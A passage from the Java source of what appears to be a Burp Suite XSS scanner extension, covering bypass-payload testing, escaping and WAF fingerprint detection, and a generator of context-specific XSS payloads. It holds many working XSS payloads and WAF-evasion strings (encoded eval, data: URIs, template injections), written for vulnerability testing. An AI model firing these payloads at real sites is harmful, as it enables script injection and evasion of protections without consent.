                                IHttpRequestResponse bypassResponse = callbacks.makeHttpRequest(httpService, bypassRequestBytes);
                                
                                if (bypassResponse == null || bypassResponse.getResponse() == null) {
                                    continue;
                                }
                                
                                // Analyze bypass response
                                byte[] bypassResponseBytes = bypassResponse.getResponse();
                                int bypassBodyOffset = helpers.analyzeResponse(bypassResponseBytes).getBodyOffset();
                                String bypassResponseBodyStr = new String(
                                    Arrays.copyOfRange(bypassResponseBytes, bypassBodyOffset, bypassResponseBytes.length),
                                    StandardCharsets.UTF_8
                                );
                                
                                // Check if bypass payload is reflected and exploitable
                                String bypassContentType = getResponseContentType(bypassResponse);
                                if (isXSSVulnerable(bypassResponseBodyStr, encodedBypass, bypassContentType)) {
                                    // BYPASS SUCCESSFUL!
                                    callbacks.printOutput("[XSSDetector] BYPASS SUCCESSFUL! Escaping bypassed with payload: " + 
                                        bypassPayload.substring(0, Math.min(50, bypassPayload.length())));
                                    
                                    // Perform advanced analysis
                                    Map<String, Object> bypassParam = new HashMap<>(parameter);
                                    bypassParam.put("ORIGINAL_PAYLOAD", bypassPayload);
                                    bypassParam.put("ENCODED_PAYLOAD", encodedBypass);
                                    bypassParam.put("BYPASS_PAYLOAD", true);
                                    bypassParam.put("ESCAPING_TYPE", escapingType);
                                    
                                    AdvancedResponseAnalysis bypassAnalysis = analyzeResponseAdvanced(
                                        bypassResponseBody, 
                                        encodedBypass, 
                                        bypassParam
                                    );
                                    
                                    if (bypassAnalysis != null && bypassAnalysis.getConfidence() > 0.0) {
                                        // Create vulnerability report for successful bypass
                                        Map<String, Object> bypassVulnData = new HashMap<>();
                                        bypassVulnData.put("paramName", (String) parameter.get(NAME));
                                        bypassVulnData.put("payload", encodedBypass);
                                        bypassVulnData.put("ORIGINAL_PAYLOAD", bypassPayload);
                                        bypassVulnData.put("ENCODED_PAYLOAD", encodedBypass);
                                        bypassVulnData.put("BYPASS_PAYLOAD", true);
                                        bypassVulnData.put("ESCAPING_TYPE", escapingType);
                                        bypassVulnData.put("BYPASSED_ESCAPING", true);
                                        bypassVulnData.put("SCAN_TYPE", "Advanced - Escaping Bypass");
                                        bypassVulnData.put("CONFIRMED_XSS", true);
                                        bypassVulnData.put("CONFIDENCE_SCORE", bypassAnalysis.getConfidence());
                                        bypassVulnData.put("XSS_SCORE", bypassAnalysis.getConfidence());
                                        
                                        // Store request/response
                                        if (bypassTestRequest != null) {
                                            bypassVulnData.put("TEST_REQUEST", bypassTestRequest.getBytes(StandardCharsets.UTF_8));
                                        }
                                        if (bypassResponseBodyStr != null) {
                                            bypassVulnData.put("TEST_RESPONSE", bypassResponseBodyStr.getBytes(StandardCharsets.UTF_8));
                                        }
                                        
                                        bypassVulnData.put("CONTENT_TYPE", bypassContentType);
                                        bypassVulnData.put("REFLECTION_CONTEXT", bypassReflectionContext);
                                        bypassVulnData.put("EVIDENCE", bypassAnalysis.getEvidence());
                                        
                                        // Create issue using issueReporter
                                        try {
                                            IHttpRequestResponse bypassRequestResponse = new SimpleHttpRequestResponseWrapper(
                                                bypassRequestBytes,
                                                bypassResponseBytes,
                                                httpService
                                            );
                                            EnhancedIssueReporter bypassIssueReporter = new EnhancedIssueReporter(helpers, callbacks, settings);
                                            IScanIssue bypassIssue = bypassIssueReporter.createEnhancedXSSIssue(bypassRequestResponse, bypassVulnData);
                                            if (bypassIssue != null) {
                                                // Return a report map similar to successful vulnerability
                                                Map<String, Object> bypassReport = new HashMap<>();
                                                bypassReport.put("ISSUE", bypassIssue);
                                                bypassReport.put("VULNERABILITY_DATA", bypassVulnData);
                                                return bypassReport; // Return successful bypass
                                            }
                                        } catch (Exception e) {
                                            callbacks.printError("Error creating bypass issue: " + e.getMessage());
                                        }
                                    }
                                }
                                
                            } catch (Exception e) {
                                if (settings != null && settings.getVerboseLogging()) {
                                    callbacks.printError("Error testing bypass payload: " + e.getMessage());
                                }
                                // Continue with next bypass payload
                            }
                        }
                        
                            if (bypassTested > 0) {
                                callbacks.printOutput("[XSSDetector] Tested " + bypassTested + " bypass payloads for escaping type: " + escapingType);
                            }
                        }
                    } else {
                        // Only log failures in verbose mode to reduce noise
                        if (settings != null && settings.getVerboseLogging()) {
                            if (isPayloadHTMLEncoded(response, encodedPayload)) {
                                callbacks.printOutput("[XSSDetector] Payload HTML-encoded (not exploitable): " + parameter.get(NAME));
                            } else if (!payloadReflected) {
                                callbacks.printOutput("[XSSDetector] Payload not reflected: " + parameter.get(NAME));
                            }
                        }
                    }
                }
            }
            
        } catch (Exception e) {
            logError("Advanced Payload Testing", e);
        }
        
        return null;
    }
    
    /**
     * CRITICAL FIX: Check if payload is HTML encoded (not exploitable)
     */
    public boolean isPayloadHTMLEncoded(String response, String payload) {
        if (response == null || payload == null) {
            return false;
        }
        
        // Check for HTML entity encoding
        String htmlEncoded = payload.replace("<", "&lt;").replace(">", "&gt;")
                                   .replace("\"", "&quot;").replace("'", "&#39;");
        
        // Check for URL encoding
        String urlEncoded = helpers.urlEncode(payload);
        
        // If we find encoded versions but NOT the raw payload, it's not exploitable
        boolean hasEncoded = response.contains(htmlEncoded) || response.contains(urlEncoded);
        boolean hasRaw = response.contains(payload);
        
        if (hasEncoded && !hasRaw) {
            callbacks.printOutput("PAYLOAD ENCODING DETECTED: HTML/URL encoded - NOT exploitable");
            callbacks.printOutput("Original: " + payload);
            callbacks.printOutput("HTML Encoded: " + htmlEncoded);
            callbacks.printOutput("URL Encoded: " + urlEncoded);
            return true;
        }
        
        return false;
    }
    
    /**
     * ADVANCED: Comprehensive escaping detection - identifies all types of escaping patterns
     * Returns a map with escaping type and details
     * Package-private for access from EngineIntegrationManager
     */
    Map<String, Object> detectEscapingPatterns(String responseBody, String payload) {
        Map<String, Object> escapingInfo = new HashMap<>();
        escapingInfo.put("ESCAPING_DETECTED", false);
        escapingInfo.put("ESCAPING_TYPE", "NONE");
        escapingInfo.put("ESCAPING_DETAILS", new ArrayList<String>());
        
        if (responseBody == null || payload == null || responseBody.trim().isEmpty() || payload.trim().isEmpty()) {
            return escapingInfo;
        }
        
        List<String> details = new ArrayList<>();
        boolean escapingDetected = false;
        String escapingType = "NONE";
        
        // 1. HTML Entity Encoding Detection
        String htmlEntityEncoded = payload.replace("<", "&lt;").replace(">", "&gt;")
                                         .replace("\"", "&quot;").replace("'", "&#39;")
                                         .replace("&", "&amp;");
        if (responseBody.contains(htmlEntityEncoded) && !responseBody.contains(payload)) {
            escapingDetected = true;
            escapingType = "HTML_ENTITY";
            details.add("HTML entity encoding detected: &lt; &gt; &quot; &#39;");
        }
        
        // 2. HTML Numeric Entity Encoding
        String htmlNumericEncoded = payload.replace("<", "&#60;").replace(">", "&#62;")
                                          .replace("\"", "&#34;").replace("'", "&#39;")
                                          .replace("&", "&#38;");
        if (responseBody.contains(htmlNumericEncoded) && !responseBody.contains(payload)) {
            escapingDetected = true;
            if (!escapingType.equals("HTML_ENTITY")) {
                escapingType = "HTML_NUMERIC_ENTITY";
            }
            details.add("HTML numeric entity encoding detected: &#60; &#62; &#34;");
        }
        
        // 3. HTML Hex Entity Encoding
        String htmlHexEncoded = payload.replace("<", "&#x3C;").replace(">", "&#x3E;")
                                      .replace("\"", "&#x22;").replace("'", "&#x27;");
        if (responseBody.contains(htmlHexEncoded) && !responseBody.contains(payload)) {
            escapingDetected = true;
            if (!escapingType.startsWith("HTML")) {
                escapingType = "HTML_HEX_ENTITY";
            }
            details.add("HTML hex entity encoding detected: &#x3C; &#x3E;");
        }
        
        // 4. URL Encoding Detection
        String urlEncoded = helpers.urlEncode(payload);
        if (responseBody.contains(urlEncoded) && !responseBody.contains(payload)) {
            escapingDetected = true;
            if (escapingType.equals("NONE")) {
                escapingType = "URL_ENCODING";
            } else {
                escapingType = escapingType + "_AND_URL";
            }
            details.add("URL encoding detected: %3C %3E %22 %27");
        }
        
        // 5. Double URL Encoding Detection
        String doubleUrlEncoded = helpers.urlEncode(urlEncoded);
        if (responseBody.contains(doubleUrlEncoded) && !responseBody.contains(payload) && !responseBody.contains(urlEncoded)) {
            escapingDetected = true;
            if (escapingType.equals("NONE")) {
                escapingType = "DOUBLE_URL_ENCODING";
            }
            details.add("Double URL encoding detected: %253C %253E");
        }
        
        // 6. JSON Escaping Detection
        String jsonEscaped = payload.replace("\\", "\\\\").replace("\"", "\\\"")
                                   .replace("'", "\\'").replace("\n", "\\n")
                                   .replace("\r", "\\r").replace("\t", "\\t");
        if (responseBody.contains(jsonEscaped) && !responseBody.contains(payload)) {
            escapingDetected = true;
            if (escapingType.equals("NONE")) {
                escapingType = "JSON_ESCAPING";
            }
            details.add("JSON escaping detected: \\\" \\\\");
        }
        
        // 7. JavaScript String Escaping Detection
        if (payload.contains("\"") || payload.contains("'")) {
            // Check for JavaScript string escaping (quotes escaped)
            String jsEscaped = payload.replace("\\", "\\\\").replace("\"", "\\\"").replace("'", "\\'");
            if (responseBody.contains(jsEscaped) && !responseBody.contains(payload)) {
                escapingDetected = true;
                if (escapingType.equals("NONE")) {
                    escapingType = "JAVASCRIPT_STRING_ESCAPING";
                }
                details.add("JavaScript string escaping detected: escaped quotes");
            }
        }
        
        // 8. Unicode Escaping Detection
        String unicodeEscaped = payload.replace("<", "\\u003c").replace(">", "\\u003e")
                                      .replace("\"", "\\u0022").replace("'", "\\u0027");
        if (responseBody.contains(unicodeEscaped) && !responseBody.contains(payload)) {
            escapingDetected = true;
            if (escapingType.equals("NONE")) {
                escapingType = "UNICODE_ESCAPING";
            }
            details.add("Unicode escaping detected: \\u003c \\u003e");
        }
        
        // 9. Partial Encoding Detection (mixed encoding)
        // Check if some characters are encoded but not all
        boolean hasPartialEncoding = false;
        if (payload.contains("<") && (responseBody.contains("&lt;") || responseBody.contains("%3C")) && 
            payload.contains(">") && (responseBody.contains("&gt;") || responseBody.contains("%3E"))) {
            // Check if it's partial (some encoded, some not)
            if (responseBody.contains(payload.substring(0, Math.min(5, payload.length()))) ||
                responseBody.contains(payload.substring(Math.max(0, payload.length() - 5)))) {
                hasPartialEncoding = true;
                escapingDetected = true;
                if (escapingType.equals("NONE")) {
                    escapingType = "PARTIAL_ENCODING";
                } else {
                    escapingType = escapingType + "_PARTIAL";
                }
                details.add("Partial/mixed encoding detected: some characters encoded, some not");
            }
        }
        
        // 10. WAF Block Detection (CASE-BY-CASE)
        // Check for WAF-specific encoding patterns
        boolean isWAFBlock = false;
        String wafType = "UNKNOWN";
        
        // Cloudflare WAF patterns
        if (responseBody.contains("cf-browser-verification") || 
            responseBody.contains("cloudflare") ||
            responseBody.contains("cf-ray") ||
            responseBody.contains("Attention Required! | Cloudflare")) {
            isWAFBlock = true;
            wafType = "CLOUDFLARE";
            escapingDetected = true;
            if (escapingType.equals("NONE")) {
                escapingType = "WAF_CLOUDFLARE";
            }
            details.add("Cloudflare WAF detected - may require specific bypass techniques");
        }
        
        // Akamai WAF patterns
        if (responseBody.contains("akamai") || 
            responseBody.contains("Reference #") ||
            responseBody.contains("AkamaiGHost")) {
            isWAFBlock = true;
            wafType = "AKAMAI";
            escapingDetected = true;
            if (escapingType.equals("NONE")) {
                escapingType = "WAF_AKAMAI";
            }
            details.add("Akamai WAF detected - may require specific bypass techniques");
        }
        
        // Imperva/Incapsula WAF patterns
        if (responseBody.contains("incapsula") || 
            responseBody.contains("imperva") ||
            responseBody.contains("Request unsuccessful")) {
            isWAFBlock = true;
            wafType = "IMPERVA";
            escapingDetected = true;
            if (escapingType.equals("NONE")) {
                escapingType = "WAF_IMPERVA";
            }
            details.add("Imperva/Incapsula WAF detected - may require specific bypass techniques");
        }
        
        // AWS WAF patterns
        if (responseBody.contains("aws") || 
            responseBody.contains("x-amzn-") ||
            responseBody.contains("AWS WAF")) {
            isWAFBlock = true;
            wafType = "AWS_WAF";
            escapingDetected = true;
            if (escapingType.equals("NONE")) {
                escapingType = "WAF_AWS";
            }
            details.add("AWS WAF detected - may require specific bypass techniques");
        }
        
        // Generic WAF detection (403, 406, 429 status codes)
        // Note: Status code check should be done by caller, but we can detect WAF patterns in response
        
        // 11. Framework-Specific Encoding Detection (CASE-BY-CASE)
        // React: May use JSX escaping
        if (responseBody.contains("__REACT_DEVTOOLS") || 
            responseBody.contains("react") ||
            responseBody.contains("ReactDOM")) {
            if (payload.contains("<") && !responseBody.contains("<") && 
                (responseBody.contains("&lt;") || responseBody.contains("\\u003c"))) {
                escapingDetected = true;
                if (escapingType.equals("NONE")) {
                    escapingType = "REACT_JSX_ESCAPING";
                }
                details.add("React JSX escaping detected - may require dangerouslySetInnerHTML bypass");
            }
        }
        
        // Vue: May use template escaping
        if (responseBody.contains("vue") || responseBody.contains("Vue")) {
            if (payload.contains("{{") && !responseBody.contains("{{")) {
                escapingDetected = true;
                if (escapingType.equals("NONE")) {
                    escapingType = "VUE_TEMPLATE_ESCAPING";
                }
                details.add("Vue template escaping detected - may require v-html bypass");
            }
        }
        
        // Angular: May use template escaping
        if (responseBody.contains("angular") || responseBody.contains("ng-")) {
            if (payload.contains("{{") && !responseBody.contains("{{")) {
                escapingDetected = true;
                if (escapingType.equals("NONE")) {
                    escapingType = "ANGULAR_TEMPLATE_ESCAPING";
                }
                details.add("Angular template escaping detected - may require [innerHTML] bypass");
            }
        }
        
        escapingInfo.put("ESCAPING_DETECTED", escapingDetected);
        escapingInfo.put("ESCAPING_TYPE", escapingType);
        escapingInfo.put("ESCAPING_DETAILS", details);
        escapingInfo.put("WAF_TYPE", wafType);
        escapingInfo.put("IS_WAF_BLOCK", isWAFBlock);
        
        if (escapingDetected) {
            callbacks.printOutput("[XSSDetector] ESCAPING DETECTED: " + escapingType + 
                                (isWAFBlock ? " (WAF: " + wafType + ")" : "") + 
                                " - " + String.join(", ", details));
        }
        
        return escapingInfo;
    }
    
    /**
     * ADVANCED: Generate bypass payloads based on detected escaping type
     * This generates context-specific bypasses to evade the detected escaping
     * Package-private for access from EngineIntegrationManager
     */
    /**
     * ADVANCED: Generate context-aware bypass payloads based on detected escaping/WAF
     * CASE-BY-CASE: Bypasses are tailored to specific escaping types and contexts
     */
    List<String> generateBypassPayloads(String originalPayload, String escapingType, String context) {
        List<String> bypassPayloads = new ArrayList<>();
        
        if (originalPayload == null || originalPayload.isEmpty()) {
            return bypassPayloads;
        }
        
        callbacks.printOutput("[XSSDetector] Generating context-aware bypass payloads for escaping type: " + escapingType + 
                            ", context: " + (context != null ? context : "UNKNOWN"));
        
        // Extract base payload components
        String basePayload = originalPayload;
        boolean hasScriptTag = basePayload.contains("<script");
        boolean hasEventHandler = basePayload.contains("onerror") || basePayload.contains("onload") || 
                                basePayload.contains("onclick") || basePayload.contains("onmouseover");
        boolean hasJavaScript = basePayload.contains("javascript:");
        
        // CRITICAL: Context-aware bypass generation - only generate relevant bypasses
        boolean isHTMLContext = context == null || context.contains("HTML") || context.contains("BODY") || 
                               context.contains("TAG") || context.contains("ATTRIBUTE");
        boolean isJSContext = context != null && (context.contains("JAVASCRIPT") || context.contains("SCRIPT"));
        boolean isJSONContext = context != null && context.contains("JSON");
        boolean isAttributeContext = context != null && context.contains("ATTRIBUTE");
        boolean isEventContext = context != null && context.contains("EVENT_HANDLER");
        
        // BYPASS 1: Mixed Encoding (part encoded, part raw) - ONLY for HTML contexts
        if (isHTMLContext && (escapingType.contains("HTML_ENTITY") || escapingType.contains("HTML_NUMERIC"))) {
            // Try encoding only the opening tag, keep payload raw
            if (hasScriptTag) {
                String mixed1 = "&lt;script&gt;alert(1)&lt;/script&gt;";
                bypassPayloads.add(mixed1);
                String mixed2 = "&#60;script&#62;alert(1)&#60;/script&#62;";
                bypassPayloads.add(mixed2);
            }
            // Try encoding only special chars, keep keywords raw
            String mixed3 = "&lt;img src=x onerror=alert(1)&gt;";
            bypassPayloads.add(mixed3);
            String mixed4 = "&#60;svg onload=alert(1)&#62;";
            bypassPayloads.add(mixed4);
        }
        
        // BYPASS 2: Alternative HTML Entities (hex, named, zero-padded) - ONLY for HTML contexts
        if (isHTMLContext && escapingType.contains("HTML")) {
            // Hex entities
            String hex1 = "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;";
            bypassPayloads.add(hex1);
            String hex2 = "&#x003C;img src=x onerror=alert(1)&#x003E;";
            bypassPayloads.add(hex2);
            // Zero-padded numeric
            String padded1 = "&#0000060;script&#0000062;alert(1)&#0000060;/script&#0000062;";
            bypassPayloads.add(padded1);
            // Mixed hex and numeric
            String mixedHex = "&#x3C;svg onload=alert(1)&#62;";
            bypassPayloads.add(mixedHex);
        }
        
        // BYPASS 3: URL Encoding Bypasses - ONLY for URL contexts or URL parameters
        if ((context != null && context.contains("URL")) || escapingType.contains("URL")) {
            // Partial URL encoding (only encode special chars)
            String partialUrl1 = "%3Cscript%3Ealert(1)%3C/script%3E";
            bypassPayloads.add(partialUrl1);
            // Double URL encoding
            String doubleUrl1 = "%253Cscript%253Ealert(1)%253C/script%253E";
            bypassPayloads.add(doubleUrl1);
            // Mixed URL encoding (some encoded, some not)
            String mixedUrl1 = "%3Cimg src=x onerror=alert(1)%3E";
            bypassPayloads.add(mixedUrl1);
            // Case variation in URL encoding
            String caseUrl1 = "%3cscript%3ealert(1)%3c/script%3e";
            bypassPayloads.add(caseUrl1);
        }
        
        // BYPASS 4: Event Handler Bypasses (no angle brackets needed)
        if (escapingType.contains("HTML_ENTITY") || escapingType.contains("HTML_NUMERIC")) {
            // Event handlers that don't require angle brackets
            bypassPayloads.add("\" onerror=alert(1) \"");
            bypassPayloads.add("' onload=alert(1) '");
            bypassPayloads.add("\" onclick=alert(1) \"");
            bypassPayloads.add("' onmouseover=alert(1) '");
            // With JavaScript protocol
            bypassPayloads.add("javascript:alert(1)");
            bypassPayloads.add("JAVASCRIPT:alert(1)");
            bypassPayloads.add("JaVaScRiPt:alert(1)");
        }
        
        // BYPASS 5: CSS-based XSS (bypasses HTML encoding) - ONLY for HTML/CSS contexts
        if (isHTMLContext && escapingType.contains("HTML") && 
            (context == null || context.contains("CSS") || context.contains("STYLE"))) {
            bypassPayloads.add("<style>@import'javascript:alert(1)';</style>");
            bypassPayloads.add("<link rel=stylesheet href=javascript:alert(1)>");
            bypassPayloads.add("<style>body{-moz-binding:url(\"data:text/xml;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\")}</style>");
        }
        
        // BYPASS 6: Data URI Bypasses
        if (escapingType.contains("HTML") || escapingType.contains("URL")) {
            bypassPayloads.add("<object data=\"data:text/html,<script>alert(1)</script>\"></object>");
            bypassPayloads.add("<iframe src=\"data:text/html,<script>alert(1)</script>\"></iframe>");
            bypassPayloads.add("<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">");
        }
        
        // BYPASS 7: Unicode Bypasses - ONLY for HTML/JavaScript contexts
        if ((isHTMLContext || isJSContext) && 
            (escapingType.contains("HTML") || escapingType.contains("URL"))) {
            // Unicode in HTML
            bypassPayloads.add("<script>alert(String.fromCharCode(88,83,83))</script>");
            bypassPayloads.add("<script>eval('\\u0061\\u006c\\u0065\\u0072\\u0074(1)')</script>");
            // Unicode in attributes
            bypassPayloads.add("<img src=x onerror=\\u0061lert(1)>");
        }
        
        // BYPASS 8: Case Variation Bypasses
        if (escapingType.contains("HTML") || escapingType.contains("URL")) {
            bypassPayloads.add("<ScRiPt>alert(1)</ScRiPt>");
            bypassPayloads.add("<SCRIPT>alert(1)</SCRIPT>");
            bypassPayloads.add("<ScRiPt>alert(1)</script>");
            bypassPayloads.add("<IMG SRC=X ONERROR=ALERT(1)>");
        }
        
        // BYPASS 9: Whitespace and Tab Bypasses - ONLY for HTML contexts (WAF bypass)
        if (isHTMLContext && (escapingType.contains("HTML") || escapingType.contains("WAF"))) {
            bypassPayloads.add("<script/type=text/javascript>alert(1)</script>");
            bypassPayloads.add("<script\n>alert(1)</script>");
            bypassPayloads.add("<script\t>alert(1)</script>");
            bypassPayloads.add("<script\r>alert(1)</script>");
            bypassPayloads.add("<script>alert(1)</script>");
        }
        
        // BYPASS 10: Filter Evasion (no script tag) - ONLY for HTML contexts
        if (isHTMLContext && (escapingType.contains("HTML") || escapingType.contains("SCRIPT") || escapingType.contains("WAF"))) {
            bypassPayloads.add("<img src=x onerror=alert(1)>");
            bypassPayloads.add("<svg onload=alert(1)>");
            bypassPayloads.add("<body onload=alert(1)>");
            bypassPayloads.add("<iframe src=javascript:alert(1)></iframe>");
            bypassPayloads.add("<input onfocus=alert(1) autofocus>");
            bypassPayloads.add("<select onfocus=alert(1) autofocus>");
            bypassPayloads.add("<textarea onfocus=alert(1) autofocus>");
            bypassPayloads.add("<keygen onfocus=alert(1) autofocus>");
            bypassPayloads.add("<video><source onerror=alert(1)>");
            bypassPayloads.add("<audio src=x onerror=alert(1)>");
        }
        
        // BYPASS 11: JSON Escaping Bypasses - ONLY for JSON contexts
        if (isJSONContext && escapingType.contains("JSON")) {
            // Try to break out of JSON string
            bypassPayloads.add("\\\";alert(1);//");
            bypassPayloads.add("\\';alert(1);//");
            bypassPayloads.add("\";alert(1);//");
            bypassPayloads.add("';alert(1);//");
            // Unicode in JSON
            bypassPayloads.add("\\u003cscript\\u003ealert(1)\\u003c/script\\u003e");
        }
        
        // BYPASS 12: JavaScript String Escaping Bypasses - ONLY for JavaScript contexts
        if (isJSContext && escapingType.contains("JAVASCRIPT")) {
            // Try different quote breaking techniques
            bypassPayloads.add("';alert(1);//");
            bypassPayloads.add("\";alert(1);//");
            bypassPayloads.add("\\';alert(1);//");
            bypassPayloads.add("\\\";alert(1);//");
            // Template literal bypass
            bypassPayloads.add("${alert(1)}");
            // Concatenation bypass
            bypassPayloads.add("'+alert(1)+'");
        }
        
        // BYPASS 13: Context-Specific Bypasses (CASE-BY-CASE)
        if (context != null) {
            // HTML Attribute context bypasses
            if (context.contains("ATTRIBUTE") || context.contains("HTML_ATTRIBUTE")) {
                // Attribute context: break out with quotes and inject event handlers
                if (!hasEventHandler) {
                    bypassPayloads.add("\" onerror=alert(1) \"");
                    bypassPayloads.add("' onload=alert(1) '");
                    bypassPayloads.add("\" onclick=alert(1) \"");
                    bypassPayloads.add("' onmouseover=alert(1) '");
                    bypassPayloads.add("\" autofocus onfocus=alert(1) \"");
                }
            }
            
            // URL/JavaScript protocol context bypasses
            if (context.contains("URL") || context.contains("ATTRIBUTE_URL_EXECUTION") || 
                context.contains("URL_JAVASCRIPT_EXECUTION")) {
                if (!hasJavaScript) {
                    bypassPayloads.add("javascript:alert(1)");
                    bypassPayloads.add("JAVASCRIPT:alert(1)");
                    bypassPayloads.add("JaVaScRiPt:alert(1)");
                    bypassPayloads.add("data:text/html,<script>alert(1)</script>");
                    bypassPayloads.add("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==");
                }
            }
            
            // JavaScript string context bypasses
            if (context.contains("JAVASCRIPT_STRING") || context.contains("JAVASCRIPT")) {
                // JavaScript string: break out with quotes
                bypassPayloads.add("';alert(1);//");
                bypassPayloads.add("\";alert(1);//");
                bypassPayloads.add("\\';alert(1);//");
                bypassPayloads.add("\\\";alert(1);//");
                bypassPayloads.add("'+alert(1)+'");
                bypassPayloads.add("\"+alert(1)+\"");
                // Template literal bypass
                bypassPayloads.add("${alert(1)}");
            }
            
            // JSON context bypasses
            if (context.contains("JSON")) {
                // JSON: break out of string
                bypassPayloads.add("\\\";alert(1);//");
                bypassPayloads.add("\\';alert(1);//");
                bypassPayloads.add("\";alert(1);//");
                bypassPayloads.add("';alert(1);//");
                // Unicode in JSON
                bypassPayloads.add("\\u003cscript\\u003ealert(1)\\u003c/script\\u003e");
            }
            
            // React-specific bypasses
            if (context.contains("REACT") || context.contains("JSX")) {
                // React JSX injection bypasses
                bypassPayloads.add("{dangerouslySetInnerHTML:{__html:'<img src=x onerror=alert(1)>'}}");
                bypassPayloads.add("React.createElement('img',{src:'x',onError:alert})");
                bypassPayloads.add("onClick={alert}");
            }
            
            // Vue-specific bypasses
            if (context.contains("VUE")) {
                // Vue template injection bypasses
                bypassPayloads.add("${alert(1)}");
                bypassPayloads.add("{{constructor.constructor('alert(1)')()}}");
                bypassPayloads.add("v-html=\"'<script>alert(1)</script>'\"");
            }
            
            // Angular-specific bypasses
            if (context.contains("ANGULAR")) {
                // Angular template injection bypasses
                bypassPayloads.add("{{constructor.constructor('alert(1)')()}}");
                bypassPayloads.add("{{$eval.constructor('alert(1)')()}}");
                bypassPayloads.add("{{$compile('alert(1)')()}}");
            }
            
            // GraphQL-specific bypasses
            if (context.contains("GRAPHQL")) {
                // GraphQL query injection bypasses
                bypassPayloads.add("query{__schema{types{name}}}");
                bypassPayloads.add("mutation{createUser(name:\"<script>alert(1)</script>\"){id}}");
            }
        }
        
        // BYPASS 14: Application-Type Specific Bypasses (CASE-BY-CASE)
        // These are only added if we know the application type from context
        if (context != null) {
            // SPA-specific bypasses (React Router, Vue Router, Angular Router)
            if (context.contains("SPA") || context.contains("ROUTER")) {
                // SPA router bypasses - context-aware
                if (isHTMLContext) {
                    bypassPayloads.add("#<script>alert(1)</script>");
                    bypassPayloads.add("?route=<script>alert(1)</script>");
                    bypassPayloads.add("?path=<script>alert(1)</script>");
                }
                if (isJSContext) {
                    bypassPayloads.add("history.pushState({},'','<script>alert(1)</script>')");
                    bypassPayloads.add("location.hash='<script>alert(1)</script>'");
                }
            }
            
            // State Management bypasses (Redux, Vuex, MobX, Zustand) - ONLY for JSON/JavaScript contexts
            if ((isJSONContext || isJSContext) && 
                (context.contains("STATE") || context.contains("STORE"))) {
                // State management uses JSON - payloads must be JSON-escaped
                String jsonEscaped = basePayload.replace("\\", "\\\\").replace("\"", "\\\"");
                bypassPayloads.add("{\"type\":\"" + jsonEscaped + "\",\"payload\":{}}");
                bypassPayloads.add("{\"action\":\"" + jsonEscaped + "\"}");
            }
        }
        
        // BYPASS 15: WAF-Specific Bypasses (CASE-BY-CASE based on detected WAF)
        // Only add WAF-specific bypasses if WAF is detected
        if (escapingType != null && escapingType.contains("WAF")) {
            String wafType = escapingType;
            
            // Cloudflare WAF bypasses
            if (wafType.contains("CLOUDFLARE")) {
                if (isHTMLContext) {
                    bypassPayloads.add("<svg/onload=alert(1)>");
                    bypassPayloads.add("<img/src=x onerror=alert(1)>");
                    bypassPayloads.add("<iframe srcdoc=<script>alert(1)</script>>");
                }
            }
            
            // Akamai WAF bypasses
            if (wafType.contains("AKAMAI")) {
                if (isHTMLContext) {
                    bypassPayloads.add("<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>");
                    bypassPayloads.add("<img src=x onerror=eval(atob('YWxlcnQoMSk='))>");
                }
            }
            
            // Imperva/Incapsula WAF bypasses
            if (wafType.contains("IMPERVA")) {
                if (isHTMLContext) {
                    bypassPayloads.add("<script>window['alert'](1)</script>");
                    bypassPayloads.add("<img src=x onerror=window['alert'](1)>");
                }
            }
            
            // AWS WAF bypasses
            if (wafType.contains("AWS")) {
                if (isHTMLContext) {
                    bypassPayloads.add("<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')</script>");
                    bypassPayloads.add("<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>");
                }
            }
        }
        
        // CRITICAL: Remove duplicates while preserving order
        bypassPayloads = new ArrayList<>(new LinkedHashSet<>(bypassPayloads));
        
        // CRITICAL: Prioritize bypasses based on context relevance
        // Context-relevant bypasses should be tried first
        List<String> prioritizedBypasses = new ArrayList<>();
        List<String> otherBypasses = new ArrayList<>();
        
        for (String bypass : bypassPayloads) {
            boolean isRelevant = false;
            
            // Check if bypass is relevant to detected context
            if (isHTMLContext && (bypass.contains("<") || bypass.contains("onerror") || bypass.contains("onload"))) {
                isRelevant = true;
            } else if (isJSContext && (bypass.contains("alert") || bypass.contains("eval") || bypass.contains("Function"))) {
                isRelevant = true;
            } else if (isJSONContext && (bypass.contains("\\\"") || bypass.contains("\\u"))) {
                isRelevant = true;
            } else if (isAttributeContext && (bypass.contains("onerror") || bypass.contains("onload") || bypass.contains("\""))) {
                isRelevant = true;
            }
            
            if (isRelevant) {
                prioritizedBypasses.add(bypass);
            } else {
                otherBypasses.add(bypass);
            }
        }
        
        // Combine: relevant first, then others
        bypassPayloads = new ArrayList<>();
        bypassPayloads.addAll(prioritizedBypasses);
        bypassPayloads.addAll(otherBypasses);
        
        // Limit size to prevent excessive requests
        if (bypassPayloads.size() > 50) {
            bypassPayloads = bypassPayloads.subList(0, 50);
        }
        
        callbacks.printOutput("[XSSDetector] Generated " + bypassPayloads.size() + " context-aware bypass payloads " +
                            "(escaping: " + escapingType + ", context: " + (context != null ? context : "UNKNOWN") + 
                            ", prioritized: " + prioritizedBypasses.size() + ")");
        
        return bypassPayloads;
    }
    
    /**
     * Create advanced test request with proper parameter injection
     */
    private String createAdvancedTestRequest(Map parameter, String payload) {
        try {
            // CRITICAL FIX: Add null checks for all parameter values
            if (parameter == null || payload == null) {
                callbacks.printError("Invalid parameter or payload for test request creation");
                return null;
            }
            
            // Safe parameter extraction with null checks
            Object typeObj = parameter.get(TYPE);
            Object nameObj = parameter.get(NAME);
            Object valueObj = parameter.get(VALUE);
            
            if (typeObj == null || nameObj == null) {
                callbacks.printError("Missing required parameter information (TYPE or NAME)");
                return null;
            }
            
            byte[] request = baseRequestResponse.getRequest();
            if (request == null) {
                callbacks.printError("Base request is null");
                return null;
            }
            
            int paramType;
            String paramName;
            String originalValue;
            
            // Safe casting with error handling - FIX FOR BYTE/INTEGER CASTING
            try {
                // Handle both Byte and Integer types for parameter TYPE
                if (typeObj instanceof Byte) {
                    paramType = ((Byte) typeObj).intValue();
                } else if (typeObj instanceof Integer) {
                    paramType = (Integer) typeObj;
                } else if (typeObj instanceof Number) {
                    paramType = ((Number) typeObj).intValue();
                } else {
